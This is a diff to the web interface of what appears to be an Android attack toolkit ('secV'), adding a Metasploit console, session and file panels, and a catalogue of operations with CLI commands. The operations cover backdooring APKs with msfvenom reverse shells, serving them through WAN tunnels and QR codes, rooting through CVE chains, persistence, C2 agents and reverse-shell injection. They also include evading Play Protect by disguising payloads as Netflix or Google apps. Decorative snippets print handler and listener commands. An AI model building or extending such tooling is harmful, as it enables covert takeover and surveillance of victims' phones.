+              <div id="pdv-msf-list" class="pd-sess-list"><div class="pd-info">Start msfconsole to see sessions.</div></div>
+              <div class="pd-act-row">
+                <button class="pd-btn" onclick="pdRefreshMsfSessions()">⟳ refresh</button>
+                <button class="pd-btn accent" onclick="pdStartHandler()">⚡ handler</button>
+                <button class="pd-btn" onclick="switchTab('msf-console')">⬛ terminal</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- OP LOG ─── -->
+        <div class="pm-row">
+          <div class="pm-lbl">Last Op Output</div>
+          <div id="pdv-op-log" class="pd-log" style="min-height:54px">No output yet.</div>
+        </div>
+
+      </div><!-- /pd-body -->
+    </div><!-- /pd-panel -->
+
+    <!-- MSF CONSOLE TAB -->
+    <div id="msf-console-panel">
+      <div class="msfc-toolbar">
+        <div id="msf2-dot"></div>
+        <span id="msf2-status">offline</span>
+        <div class="tt-sep"></div>
+        <button class="pd-btn" onclick="startMsfConsole()">▶ start msfconsole</button>
+        <button class="pd-btn" onclick="stopMsf()">■ stop</button>
+        <div class="tt-sep"></div>
+        <button class="pd-btn accent" onclick="pdStartHandler()">⚡ handler</button>
+        <button class="pd-btn" onclick="msfSend2('sessions -l')">sessions</button>
+        <button class="pd-btn" onclick="msfSend2('sessions -i 1')">interact 1</button>
+        <button class="pd-btn" onclick="msfSend2('sysinfo')">sysinfo</button>
+        <button class="pd-btn" onclick="msfSend2('screenshot')">screenshot</button>
+        <button class="pd-btn" onclick="msfSend2('shell')">shell</button>
+        <div class="tt-sep"></div>
+        <button class="pd-btn" onclick="clearMsf2()">⌧ clear</button>
+        <button class="pd-btn" onclick="switchTab('pd');pdNav(\'sessions\')">→ sessions</button>
+        <span id="msf2-sess-ct" style="margin-left:auto;font-size:0.58rem;color:var(--muted);letter-spacing:0.06em;"></span>
+      </div>
+      <div id="msf2-terminal"></div>
+      <div id="msf2-input-row">
+        <span id="msf2-prompt">msf6&gt;&nbsp;</span>
+        <input id="msf2-input" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
+          placeholder="sessions -l  ·  sessions -i 1  ·  use exploit/multi/handler  ·  run -j"
+          onkeydown="msf2Enter(event)">
+      </div>
+    </div>
+
     <!-- FILES TAB -->
-    <div id="files-panel"></div>
+    <div id="files-panel">
+      <div id="fm-toolbar">
+        <span style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-right:4px;">Host</span>
+        <button class="fm-tb-btn" onclick="fmHostNav(fmHostPath)">⟳ refresh</button>
+        <button class="fm-tb-btn" onclick="fmHostNav(document.getElementById('fm-host-path-inp').value||fmHostPath)">⏎ go</button>
+        <input id="fm-host-path-inp" type="text" style="flex:1;min-width:120px;max-width:320px;background:var(--bg2);border:1px solid var(--border2);color:var(--white);font-family:var(--mono);font-size:0.65rem;padding:4px 8px;" placeholder="/home/..." onkeydown="if(event.key==='Enter')fmHostNav(this.value)">
+        <button class="fm-tb-btn" onclick="fmMkdir('host')">+ folder</button>
+        <button class="fm-tb-btn go" onclick="fmUploadClick()">⬆ upload</button>
+        <input id="fm-upload-inp" type="file" style="display:none" onchange="fmUploadFile(this)">
+        <span style="font-size:0.6rem;color:var(--border2);margin:0 4px;">│</span>
+        <span style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-right:4px;">Device</span>
+        <button class="fm-tb-btn" onclick="fmDevNav(fmDevPath)">⟳ refresh</button>
+        <button class="fm-tb-btn" onclick="fmPullApkDialog()">⬇ pull APK</button>
+        <button class="fm-tb-btn" onclick="fmDevNav('/sdcard')">/ sdcard</button>
+        <button class="fm-tb-btn" onclick="fmDevNav('/data/app')">/ data</button>
+      </div>
+      <div id="fm-body">
+        <!-- Host pane -->
+        <div class="fm-pane" id="fm-host-pane">
+          <div class="fm-pane-hdr">
+            <span class="fm-pane-title">Host</span>
+            <span id="fm-host-count" style="margin-left:auto;font-size:0.58rem;"></span>
+          </div>
+          <div class="fm-breadcrumb" id="fm-host-bc"></div>
+          <div class="fm-list" id="fm-host-list"></div>
+          <div class="fm-status" id="fm-host-status"></div>
+        </div>
+        <!-- Device pane -->
+        <div class="fm-pane" id="fm-dev-pane">
+          <div class="fm-pane-hdr">
+            <span class="fm-pane-title">Device</span>
+            <span id="fm-dev-count" style="margin-left:auto;font-size:0.58rem;"></span>
+          </div>
+          <div class="fm-breadcrumb" id="fm-dev-bc"></div>
+          <div class="fm-list" id="fm-dev-list">
+            <div class="fm-empty">Connect a device and click ⟳ to browse</div>
+          </div>
+          <div class="fm-status" id="fm-dev-status"></div>
+        </div>
+        <!-- Preview pane -->
+        <div id="fm-preview">
+          <div id="fm-preview-hdr">Preview</div>
+          <div id="fm-preview-content"><div style="color:var(--muted);font-size:0.65rem;padding:16px;">Select a file to preview</div></div>
+        </div>
+      </div>
+      <!-- context menu -->
+      <div id="fm-ctx" class="fm-ctx" style="display:none;"></div>
+    </div>
     <!-- SETUP TAB -->
     <div id="setup-panel">
       <div style="color:var(--muted);font-size:0.68rem;margin-bottom:8px;letter-spacing:0.02em;">Global defaults applied to all operations. Dependency status auto-detected.</div>
@@ -1752,9 +3096,12 @@ a{color:var(--blue);text-decoration:none;}
       </div>
       <button id="save-settings" onclick="saveSettings()">💾 Save settings</button>
       <button class="tb-btn" style="margin-left:8px;margin-top:8px;" onclick="detectLhost()">⟳ Auto-detect LHOST</button>
-      <div style="color:var(--grey);font-size:0.58rem;margin:12px 0 6px;letter-spacing:0.18em;text-transform:uppercase;">Dependencies</div>
+      <div style="display:flex;align-items:center;gap:8px;margin:12px 0 6px;">
+        <div style="color:var(--grey);font-size:0.58rem;letter-spacing:0.18em;text-transform:uppercase;font-weight:700;">Dependencies</div>
+        <span id="dep-pkgmgr" style="display:none;font-family:var(--mono);font-size:0.55rem;letter-spacing:0.1em;padding:1px 7px;border:1px solid var(--cat-c2);color:var(--cat-c2);text-transform:uppercase;"></span>
+      </div>
       <div id="dep-grid" class="dep-grid">
-        <div style="color:var(--muted);font-size:0.68rem;padding:12px 14px;">Loading...</div>
+        <div style="color:var(--muted);font-size:0.68rem;padding:12px 14px;">Loading…</div>
       </div>
     </div>
     <!-- LIVE MEDIA PANEL -->
@@ -1887,89 +3234,159 @@ a{color:var(--blue);text-decoration:none;}
 
 <script>
 // ── Operation definitions ─────────────────────────────────────────────────────
+const OPS_CATS = {
+  "Recon & Analysis":      "recon",
+  "Access & Escalation":   "access",
+  "Payload & Delivery":    "payload",
+  "Instrumentation":       "instr",
+  "Persistence":           "persist",
+  "C2 & Agent":            "c2",
+  "Evasion & Customization":"evasion",
+  "Automated Chains":      "auto",
+};
+
 const OPS = {
   "Recon & Analysis": [
-    {id:"recon", label:"recon", desc:"Device fingerprinting: model, Android ver, root, SELinux, bootloader, chipset, patch level",
+    {id:"recon", label:"recon",
+     desc:"Device fingerprinting: model, Android ver, root status, SELinux, bootloader, chipset, patch level.",
+     cli:"secv android recon",
      fields:[]},
-    {id:"app_scan", label:"app scan", desc:"Full APK analysis: manifest, permissions, components, secrets, security score",
+    {id:"app_scan", label:"app scan",
+     desc:"Full APK analysis: manifest, permissions, exported components, hardcoded secrets, security score.",
+     cli:"secv android app_scan [--package com.target.app] [--deep] [--secrets]",
      fields:[
        {n:"package",p:"",t:"text",label:"Package (blank=all)"},
-       {n:"deep_analysis",p:"false",t:"select",opts:["false","true"],label:"Deep (jadx)"},
+       {n:"deep_analysis",p:"false",t:"select",opts:["false","true"],label:"Deep analysis (jadx)"},
        {n:"search_secrets",p:"true",t:"select",opts:["true","false"],label:"Search secrets"},
        {n:"scan_limit",p:"5",t:"text",label:"App limit"},
        {n:"bypass_ssl",p:"false",t:"select",opts:["false","true"],label:"SSL bypass patch"},
      ]},
-    {id:"vuln_scan", label:"vuln scan", desc:"Device+app CVE assessment (2019-2026, MediaTek, NVD live lookups)",
+    {id:"vuln_scan", label:"vuln scan",
+     desc:"Device + app CVE assessment (2019–2026, MediaTek chipsets, NVD live API lookups).",
+     cli:"secv android vuln_scan [--package com.target.app] [--nvd-key KEY]",
      fields:[
        {n:"package",p:"",t:"text",label:"Package (blank=all)"},
-       {n:"nvd_api_key",p:"",t:"text",label:"NVD API key (opt)"},
+       {n:"nvd_api_key",p:"",t:"text",label:"NVD API key (optional)"},
      ]},
-    {id:"exploit", label:"exploit", desc:"Intent injection, SQL injection on content providers, path traversal, exported components",
+    {id:"exploit", label:"exploit",
+     desc:"Intent injection, SQL injection on content providers, path traversal, exported component abuse.",
+     cli:"secv android exploit --package com.target.app",
      fields:[{n:"package",p:"com.target.app",t:"text",label:"Package (required)"}]},
-    {id:"network", label:"network", desc:"Packet capture (tcpdump via root) + logcat credential leakage analysis",
-     fields:[{n:"package",p:"",t:"text",label:"Package (opt)"}]},
-    {id:"forensics", label:"forensics", desc:"DB/SharedPrefs extraction (root), logcat, ADB backup, SQLite inspection",
+    {id:"network", label:"network",
+     desc:"Packet capture (tcpdump via root) + logcat credential leakage analysis.",
+     cli:"secv android network [--package com.target.app]",
+     fields:[{n:"package",p:"",t:"text",label:"Package (optional)"}]},
+    {id:"forensics", label:"forensics",
+     desc:"DB/SharedPrefs extraction (root), logcat dump, ADB backup, SQLite inspection.",
+     cli:"secv android forensics --package com.target.app [--backup]",
      fields:[
        {n:"package",p:"com.target.app",t:"text",label:"Package (required)"},
        {n:"backup",p:"false",t:"select",opts:["false","true"],label:"ADB backup"},
      ]},
-    {id:"device_net_scan", label:"device net scan", desc:"Scan device WiFi subnet via netrecon — detect open ADB TCP, web services",
+    {id:"device_net_scan", label:"device net scan",
+     desc:"Scan device WiFi subnet — detect open ADB TCP ports, web services, other Android devices.",
+     cli:"secv android device_net_scan",
      fields:[]},
-    {id:"full", label:"full scan", desc:"All of: recon + app_scan + vuln_scan + exploit + network + forensics",
+    {id:"full", label:"full scan",
+     desc:"Full chain: recon + app_scan + vuln_scan + exploit + network + forensics in one pass.",
+     cli:"secv android full [--package com.target.app] [--deep]",
      fields:[
        {n:"package",p:"",t:"text",label:"Package (blank=all)"},
-       {n:"deep_analysis",p:"false",t:"select",opts:["false","true"],label:"Deep (jadx)"},
+       {n:"deep_analysis",p:"false",t:"select",opts:["false","true"],label:"Deep analysis (jadx)"},
        {n:"search_secrets",p:"true",t:"select",opts:["true","false"],label:"Search secrets"},
      ]},
   ],
   "Access & Escalation": [
-    {id:"adb_wifi", label:"adb wifi", desc:"Enable ADB over TCP/WiFi (adb tcpip 5555) — drop USB dependency",
+    {id:"adb_wifi", label:"adb wifi",
+     desc:"Enable ADB over TCP/WiFi (adb tcpip 5555) — drop the USB cable.",
+     cli:"secv android adb_wifi [--adb-port 5555]",
      fields:[{n:"adb_port",p:"5555",t:"text",label:"ADB TCP port"}]},
-    {id:"get_root", label:"get root", desc:"Multi-vector root: Magisk su → adb root → CVE-2024-0044 → mtk-su → KernelSU",
+    {id:"get_root", label:"get root",
+     desc:"Multi-vector root: Magisk su → adb root → CVE-2024-0044 → mtk-su → KernelSU fallback.",
+     cli:"secv android get_root",
      fields:[]},
-    {id:"exploit_cve", label:"exploit CVE", desc:"Targeted CVE exploitation. Supported: CVE-2024-0044, CVE-2023-45866, CVE-2024-31317",
+    {id:"exploit_cve", label:"exploit CVE",
+     desc:"Targeted single-CVE exploitation. Supported: CVE-2024-0044 (install-bypass), CVE-2023-45866 (Bluetooth HID), CVE-2024-31317.",
+     cli:"secv android exploit_cve --cve CVE-2024-0044",
      fields:[
        {n:"cve",p:"CVE-2024-0044",t:"select",
         opts:["CVE-2024-0044","CVE-2023-45866","CVE-2024-31317"],label:"CVE ID"},
      ]},
-    {id:"cve_chain", label:"CVE chain", desc:"Chain multiple CVEs: bt_to_root, sandbox_exfil, zero_click_full, or custom list",
+    {id:"cve_chain", label:"CVE chain",
+     desc:"Multi-CVE chain: bt_to_root, sandbox_exfil, zero_click_full, or custom comma-separated list.",
+     cli:"secv android cve_chain --chain bt_to_root",
      fields:[
        {n:"chain",p:"bt_to_root",t:"select",
-        opts:["bt_to_root","sandbox_exfil","zero_click_full","custom"],label:"Chain"},
+        opts:["bt_to_root","sandbox_exfil","zero_click_full","custom"],label:"Chain preset"},
        {n:"chain_custom",p:"",t:"text",label:"Custom chain (comma-sep CVEs)"},
      ]},
-    {id:"zero_click", label:"zero click", desc:"Zero-click attack surface: Bluetooth HID, NFC NDEF, WiFi broadcast, media parser",
+    {id:"zero_click", label:"zero click",
+     desc:"Zero-click attack surface probe: Bluetooth HID, NFC NDEF, WiFi broadcast, media parser.",
+     cli:"secv android zero_click --vector all",
      fields:[
        {n:"vector",p:"all",t:"select",opts:["all","bt","nfc","wifi","media"],label:"Vector"},
      ]},
   ],
   "Payload & Delivery": [
     {id:"backdoor_apk", label:"backdoor APK",
-     desc:"Pull APK → inject msfvenom payload (-x template) → sign → WAN expose (bore/cloudflare) → delivery QR. WAN expose runs automatically unless disabled.",
+     desc:"Inject Metasploit payload into an APK — msfvenom -x template pipeline + apktool smali merge + re-sign. Accepts local APK path or pulls from device by package. WAN expose runs after unless disabled.",
+     cli:"secv android backdoor_apk --apk-path /path/to/app.apk --lhost LHOST --lport 4444",
      runLabel:"INJECT",
      fields:[
-       {n:"package",p:"",t:"text",label:"Package (blank = local APK)"},
+       {n:"apk_path",p:"",t:"text",label:"APK path (local — no device needed)"},
+       {n:"package",p:"",t:"text",label:"Package (pull from device)"},
        {n:"lhost",p:"",t:"text",label:"LHOST (auto-detect)"},
        {n:"lport",p:"4444",t:"text",label:"LPORT"},
+       {n:"payload",p:"tcp",t:"select",opts:["tcp","http","https","shell","stageless"],label:"Payload type"},
+       {n:"install",p:"false",t:"select",opts:["false","true"],label:"Install on device after build"},
+       {n:"wan_expose",p:"true",t:"select",opts:["true","false"],label:"WAN expose after inject"},
+       {n:"serve_port",p:"8891",t:"text",label:"APK HTTP server port"},
+     ]},
+    {id:"wan_expose", label:"WAN expose",
+     desc:"Start WAN tunnel + detached APK HTTP server. Primary: localhost.run SSH tunnel (HTTPS). Fallback: bore → cloudflared. Generates delivery URL + QR.",
+     cli:"secv android wan_expose --serve-port 8891 --tunnel localhost.run",
+     runLabel:"EXPOSE",
+     fields:[
+       {n:"serve_port",p:"8891",t:"text",label:"APK HTTP server port"},
+       {n:"tunnel",p:"localhost.run",t:"select",opts:["localhost.run","bore","cloudflared"],label:"Tunnel method"},
+       {n:"bore_server",p:"bore.pub",t:"text",label:"bore server (bore mode)"},
+     ]},
+    {id:"qr_exploit", label:"QR / delivery",
+     desc:"Generate QR codes for payload delivery: APK URL, Android Intent URI, ADB wireless pairing, deeplink, WAN, or custom string.",
+     cli:"secv android qr_exploit --mode wan --apk-path /path/to/app.apk",
+     runLabel:"GENERATE",
+     fields:[
+       {n:"mode",p:"wan",t:"select",opts:["wan","apk","intent","adb_pair","deeplink","custom"],label:"QR mode"},
+       {n:"apk_path",p:"",t:"text",label:"APK path (wan/apk modes)"},
+       {n:"lhost",p:"",t:"text",label:"LHOST (apk mode)"},
+       {n:"lport",p:"8891",t:"text",label:"Serve port (apk mode)"},
+       {n:"bore_server",p:"bore.pub",t:"text",label:"bore server (wan mode)"},
+       {n:"custom_str",p:"",t:"text",label:"Custom string (custom mode)"},
+     ]},
+    {id:"msf_handler", label:"MSF handler",
+     desc:"Write handler.rc and launch Metasploit multi/handler in background. Run this before the target installs the backdoored APK.",
+     cli:"secv android msf_handler --lhost LHOST --lport 4444 --payload tcp",
+     runLabel:"START HANDLER",
+     fields:[
+       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
+       {n:"lport",p:"4444",t:"text",label:"LPORT"},
        {n:"payload",p:"tcp",t:"select",opts:["tcp","http","https","shell","stageless"],label:"Payload"},
-       {n:"install",p:"false",t:"select",opts:["false","true"],label:"Install on device"},
-       {n:"wan_expose",p:"true",t:"select",opts:["true","false"],label:"WAN expose (bore/cloudflare)"},
-       {n:"serve_port",p:"8888",t:"text",label:"APK serve port"},
-       {n:"bore_server",p:"bore.pub",t:"text",label:"bore server"},
+       {n:"launch",p:"true",t:"select",opts:["true","false"],label:"Launch msfconsole"},
      ]},
     {id:"deploy_shell", label:"deploy shell",
-     desc:"Generate fresh msfvenom APK → adb install (no root) → WAN expose + delivery QR. Installs directly onto device; WAN expose runs automatically unless disabled.",
-     runLabel:"INJECT",
+     desc:"Generate fresh msfvenom APK → adb install on device → WAN expose + QR. No template needed — builds com.metasploit.stage from scratch.",
+     cli:"secv android deploy_shell --lhost LHOST --lport 4444",
+     runLabel:"DEPLOY",
      fields:[
        {n:"lhost",p:"",t:"text",label:"LHOST (auto-detect)"},
        {n:"lport",p:"4444",t:"text",label:"LPORT"},
        {n:"payload",p:"tcp",t:"select",opts:["tcp","http","https","shell","stageless"],label:"Payload"},
        {n:"wan_expose",p:"true",t:"select",opts:["true","false"],label:"WAN expose after deploy"},
-       {n:"serve_port",p:"8888",t:"text",label:"APK serve port"},
-       {n:"bore_server",p:"bore.pub",t:"text",label:"bore server"},
+       {n:"serve_port",p:"8891",t:"text",label:"APK serve port"},
      ]},
-    {id:"rebuild", label:"rebuild APK",
-     desc:"Build BootBuddy WAN C2 APK: BootReceiver + DexClassLoader + bore tunnel + QR delivery",
+    {id:"rebuild", label:"rebuild APK · BootBuddy",
+     desc:"Build stageless WAN C2 APK: BootReceiver + AgentService + DexClassLoader runtime payload chain. No static shellcode. Persists across reboots.",
+     cli:"secv android rebuild --lhost LHOST [--msf] [--msf-lport 4444]",
      runLabel:"BUILD",
      fields:[
        {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
@@ -1979,30 +3396,38 @@ const OPS = {
        {n:"bore_msf_port",p:"37993",t:"text",label:"bore MSF port"},
        {n:"bore_server",p:"bore.pub",t:"text",label:"bore server"},
      ]},
+  ],
+  "Instrumentation": [
+    {id:"frida_hook", label:"frida hook",
+     desc:"Auto-deploy frida-server to device, then run SSL unpin + root bypass + credential dump + method trace.",
+     cli:"secv android frida_hook --package com.target.app --mode all",
+     fields:[
+       {n:"package",p:"com.target.app",t:"text",label:"Package (required)"},
+       {n:"hook_mode",p:"all",t:"select",opts:["all","ssl_unpin","root_bypass","dump_creds","trace"],label:"Hook mode"},
+       {n:"hook_timeout",p:"30",t:"text",label:"Timeout (s)"},
+       {n:"trace_method",p:"",t:"text",label:"Trace method (trace mode only)"},
+     ]},
     {id:"objection_patch", label:"objection patch",
-     desc:"Embed Frida gadget into APK via objection (no root needed at runtime) → sign → WAN expose + delivery QR",
+     desc:"Embed Frida gadget via Objection — no root needed at runtime. Repackages + re-signs APK. WAN expose + QR auto-run after patching.",
+     cli:"secv android objection_patch --package com.target.app",
      runLabel:"PATCH",
      fields:[
        {n:"package",p:"com.target.app",t:"text",label:"Package"},
        {n:"install",p:"false",t:"select",opts:["false","true"],label:"Install patched APK"},
        {n:"wan_expose",p:"true",t:"select",opts:["true","false"],label:"WAN expose after patch"},
-       {n:"serve_port",p:"8888",t:"text",label:"APK serve port"},
-       {n:"bore_server",p:"bore.pub",t:"text",label:"bore server"},
+       {n:"serve_port",p:"8891",t:"text",label:"APK serve port"},
      ]},
-  ],
-  "Instrumentation": [
-    {id:"frida_hook", label:"frida hook", desc:"Auto-deploy frida-server, SSL unpin + root bypass + cred dump + trace",
-     fields:[
-       {n:"package",p:"com.target.app",t:"text",label:"Package (required)"},
-       {n:"hook_mode",p:"all",t:"select",opts:["all","ssl_unpin","root_bypass","dump_creds","trace"],label:"Hook mode"},
-       {n:"hook_timeout",p:"30",t:"text",label:"Timeout (s)"},
-       {n:"trace_method",p:"",t:"text",label:"Trace method (trace mode)"},
-     ]},
-    {id:"hook", label:"LSPosed hook", desc:"Three-vector persistence hook: Magisk service.sh, SharedUID shell, LSPosed/Zygote",
+    {id:"hook", label:"LSPosed hook",
+     desc:"Three-vector persistence hook: Magisk service.sh + SharedUID shell + LSPosed/Zygote injection.",
+     cli:"secv android hook --package com.target.app",
      fields:[{n:"package",p:"com.target.app",t:"text",label:"Package"}]},
-    {id:"unhook", label:"unhook", desc:"Remove all injected hooks planted by the hook operation",
+    {id:"unhook", label:"unhook",
+     desc:"Remove all hooks/agents planted by previous hook operations.",
+     cli:"secv android unhook",
      fields:[]},
-    {id:"process_inject", label:"process inject", desc:"Live process sniffer — attach to running APK process and inject reverse shell; optional persistence",
+    {id:"process_inject", label:"process inject",
+     desc:"Live process sniffer — attach to a running process PID and inject a reverse shell. Optional persistence install.",
+     cli:"secv android process_inject --action inject --target-process PID --lhost LHOST --lport 4444",
      runLabel:"INJECT",
      fields:[
        {n:"action",p:"inject",t:"select",opts:["sniff","inject","persist_only"],label:"Action"},
@@ -2015,42 +3440,69 @@ const OPS = {
      hasProcSniff: true},
   ],
   "Persistence": [
-    {id:"persist", label:"persist", desc:"Boot Receiver (no root) + Magisk post-fs-data.d script + Magisk module service.sh",
+    {id:"persist", label:"persist",
+     desc:"Three-layer persistence: BootReceiver (no root) + Magisk post-fs-data.d hook + Magisk module service.sh.",
+     cli:"secv android persist --lhost LHOST --lport 4444",
      fields:[
        {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
        {n:"lport",p:"4444",t:"text",label:"LPORT"},
      ]},
   ],
   "C2 & Agent": [
-    {id:"inject_agent", label:"inject agent", desc:"Push native ARM64/shell agent, receive JSON recon + TCP C2 callback, auto-escalate",
+    {id:"inject_agent", label:"inject agent",
+     desc:"Push native ARM64/shell agent to device — receives JSON recon + TCP C2 callback with optional auto-escalation.",
+     cli:"secv android inject_agent --mode recon --c2-host LHOST --c2-port 8889",
      fields:[
        {n:"agent_mode",p:"recon",t:"select",opts:["recon","exploit","c2"],label:"Agent mode"},
        {n:"c2_host",p:"",t:"text",label:"C2 host (auto)"},
        {n:"c2_port",p:"8889",t:"text",label:"C2 port"},
        {n:"c2_timeout",p:"20",t:"text",label:"Callback timeout (s)"},
        {n:"escalate",p:"false",t:"select",opts:["false","true"],label:"Auto escalate"},
-       {n:"lhost",p:"",t:"text",label:"Shell LHOST (escalate)"},
-       {n:"lport",p:"4444",t:"text",label:"Shell LPORT (escalate)"},
+       {n:"lhost",p:"",t:"text",label:"Shell LHOST (escalate mode)"},
+       {n:"lport",p:"4444",t:"text",label:"Shell LPORT (escalate mode)"},
      ]},
-    {id:"msf_handler", label:"MSF handler", desc:"Generate + launch Metasploit multi/handler + start msfrpcd for RPC",
-     fields:[
-       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
-       {n:"lport",p:"4444",t:"text",label:"LPORT"},
-       {n:"payload",p:"tcp",t:"select",opts:["tcp","http","https","shell","stageless"],label:"Payload"},
-       {n:"launch",p:"false",t:"select",opts:["false","true"],label:"Launch msfconsole"},
-     ]},
-    {id:"c2_gui", label:"C2 dashboard (ext)", desc:"Launch secV C2 web dashboard as a separate server (also available as the C2 tab)",
-     fields:[{n:"c2_port",p:"8891",t:"text",label:"GUI port"}]},
-    {id:"c2_cli", label:"C2 CLI", desc:"Launch C2 server in CLI mode (headless, no browser)",
+    {id:"c2_gui", label:"C2 dashboard",
+     desc:"Launch secV C2 web dashboard as a separate process — also accessible via the C2 tab above.",
+     cli:"secv android c2_gui --c2-port 8889",
+     fields:[{n:"c2_port",p:"8889",t:"text",label:"C2 port"}]},
+    {id:"c2_cli", label:"C2 CLI",
+     desc:"Launch C2 server in headless CLI mode — no browser required.",
+     cli:"secv android c2_cli",
      fields:[]},
   ],
+  "Evasion & Customization": [
+    {id:"bypass_play_protect", label:"bypass Play Protect",
+     desc:"Repackage APK to evade static Play Protect: rename metasploit package → GMS-lookalike, scrub manifest URI scheme, rename suspicious classes, inject junk decoy class, re-sign with convincing CN. No device needed.",
+     cli:"secv android bypass_play_protect --apk-path /path/to/payload.apk --app-name 'Netflix Inc.'",
+     runLabel:"EVADE",
+     fields:[
+       {n:"apk_path",p:"",t:"text",label:"APK path (blank = latest built)"},
+       {n:"app_name",p:"Netflix Inc.",t:"text",label:"Signing cert CN"},
+       {n:"fake_pkg",p:"",t:"text",label:"Override package (blank = random GMS)"},
+     ]},
+    {id:"customize_apk", label:"customize APK",
+     desc:"Patch icon (all 6 mipmap densities), launcher label, and applicationId/package name. Accepts local PNG/JPG or HTTPS URL. Hot-swaps delivery link on completion.",
+     cli:"secv android customize_apk --apk-path /path/to/app.apk --label Netflix --pkg com.netflix.mediastream --icon /path/to/icon.png",
+     runLabel:"PATCH",
+     fields:[
+       {n:"apk_path",p:"",t:"text",label:"APK path (blank = latest evaded)"},
+       {n:"app_label",p:"Netflix",t:"text",label:"App label (launcher name)"},
+       {n:"package_name",p:"com.netflix.mediastream",t:"text",label:"Package / applicationId"},
+       {n:"icon_path",p:"",t:"text",label:"Icon path or HTTPS URL"},
+       {n:"output_name",p:"Netflix_v8.114.apk",t:"text",label:"Output filename"},
+     ]},
+  ],
   "Automated Chains": [
-    {id:"full_pwn", label:"full pwn", desc:"recon → adb_wifi → get_root → device_net_scan → deploy_shell → persist → wan_expose",
+    {id:"full_pwn", label:"full pwn",
+     desc:"Full chain: recon → adb_wifi → get_root → device_net_scan → deploy_shell → persist → wan_expose.",
+     cli:"secv android full_pwn --lhost LHOST --lport 4444",
      fields:[
        {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
        {n:"lport",p:"4444",t:"text",label:"LPORT"},
      ]},
-    {id:"multi_device", label:"multi device", desc:"Run any operation on ALL connected devices simultaneously",
+    {id:"multi_device", label:"multi device",
+     desc:"Run any operation on ALL connected devices simultaneously — parallel session management.",
+     cli:"secv android multi_device --op recon",
      fields:[
        {n:"sub_operation",p:"recon",t:"select",
         opts:["recon","vuln_scan","full_pwn","inject_agent","app_scan","get_root","persist"],
@@ -2073,16 +3525,163 @@ let _sessionColors = ['#4caf50','#44ddff','#ffcc44','#aa66ff','#4488ff',
                       '#44ff99','#66ddff','#ffdd66','#cc88ff','#66aaff'];
 let settings   = {lhost:"",lport:"4444",bore_server:"bore.pub",nvd_api_key:"",c2_host:"",c2_port:"8889"};
 
-// ── Init ──────────────────────────────────────────────────────────────────────
+// ── Code Tattoo Background ─────────────────────────────────────────────────────
+// Subtle fading-tattoo effect: code fragments glow at very low opacity in grey,
+// appearing/fading at fixed positions like ghost ink — no movement, no rain.
+function initCodeBg() {
+  const canvas = document.getElementById('code-bg');
+  if (!canvas) return;
+  const ctx = canvas.getContext('2d');
+
+  // Session/security-related source code snippets — the "soul" of the tool
+  const SNIPPETS = [
+    // Session management
+    '_sessions[sid] = {"op": op, "status": "running"}',
+    'with _sessions_lock: _session_seq += 1',
+    'def _api_sessions(self): rows = [...]',
+    'updateSessionsBar(); // refresh pills',
+    '_activeSessions[sid] = {op, device, color}',
+    'if d.session_id: watchSession(d.session_id)',
+    'fetch(\'/api/msf/sessions\').then(r=>r.json())',
+    // Payload delivery
+    'msfvenom -x template.apk -p android/meterpreter/reverse_tcp',
+    'apktool d --no-src -o decoded/ target.apk',
+    'apksigner sign --ks evade_signing.keystore',
+    'ssh -R 80:localhost:8891 localhost.run',
+    'adb install -r -t payload.apk',
+    'adb connect 192.168.x.x:5555',
+    // Evasion
+    'smali.replace("com/metasploit/stage", fake_pkg)',
+    'manifest.remove("android:scheme=\\"metasploit\\"")',
+    'class Payload -> DataConnector',
+    'class MainService -> AnalyticsService',
+    'keytool -genkey -alias evade -dname "CN=Netflix Inc"',
+    // MSF
+    'use exploit/multi/handler',
+    'set PAYLOAD android/meterpreter/reverse_tcp',
+    'set ExitOnSession false; run -j',
+    'sessions -l; sessions -i 1',
+    'meterpreter > sysinfo; screenshot',
+    // SSE + backend
+    'data: ' + JSON.stringify({sid:1,op:'backdoor_apk',status:'running'}),
+    '_broadcast(json.dumps({"event":"session","sid":sid}))',
+    'EventSource(\'/api/sse\').onmessage = handleEvent',
+    'ThreadingHTTPServer(("",port), Handler).serve_forever()',
+    // ADB
+    'adb shell pm path com.target.app | cut -d: -f2',
+    'adb shell am start -n pkg/.MainActivity',
+    'adb pull /data/app/com.target.app/base.apk',
+    // Python backend
+    'global _session_seq, _sessions, _msf_proc',
+    'subprocess.Popen(["msfconsole","-q","-x",init])',
+    'pty.fork() -> master_fd, slave_fd',
+    // Networking
+    'bore local 4444 --to bore.pub:7835',
+    'LHOST=`ip route get 1 | awk \'{print $7}\'`',
+    'nc -lvnp 4444  # catch incoming shell',
+    // secV arch
+    '// secV v2.4.2 · tauri · concurrent sessions',
+    'secV.run(op, target, params) -> session_id',
+    '// golang concurrent session manager',
+  ];
+
+  let W = 0, H = 0;
+  const FONT_SIZE = 11;
+  const FONT = `${FONT_SIZE}px "JetBrains Mono", monospace`;
+  const MAX_TATTOOS = 28;
+  const FADE_IN_FRAMES = 80;
+  const HOLD_FRAMES   = 260;
+  const FADE_OUT_FRAMES = 80;
+  const TOTAL_LIFE = FADE_IN_FRAMES + HOLD_FRAMES + FADE_OUT_FRAMES;
+  // max alpha — very subtle, tattoo-like
+  const MAX_ALPHA = 0.055;
+  const ACCENT_ALPHA = 0.08;
+
+  let tattoos = [];
+
+  function makeTattoo(i) {
+    const text  = SNIPPETS[Math.floor(Math.random() * SNIPPETS.length)];
+    const isAccent = Math.random() < 0.12; // 12% chance of slight cyan tint
+    return {
+      text,
+      x: 20 + Math.random() * (W - 200),
+      y: 20 + Math.random() * (H - 20),
+      frame: -Math.floor(Math.random() * TOTAL_LIFE), // stagger start
+      maxAlpha: isAccent ? ACCENT_ALPHA : MAX_ALPHA,
+      color: isAccent ? '#88ccdd' : '#888888',
+    };
+  }
+
+  function resize() {
+    W = canvas.width  = window.innerWidth;
+    H = canvas.height = window.innerHeight;
+    // clear and respawn on resize
+    ctx.clearRect(0, 0, W, H);
+    tattoos = Array.from({length: MAX_TATTOOS}, (_, i) => makeTattoo(i));
+  }
+  resize();
+  window.addEventListener('resize', resize);
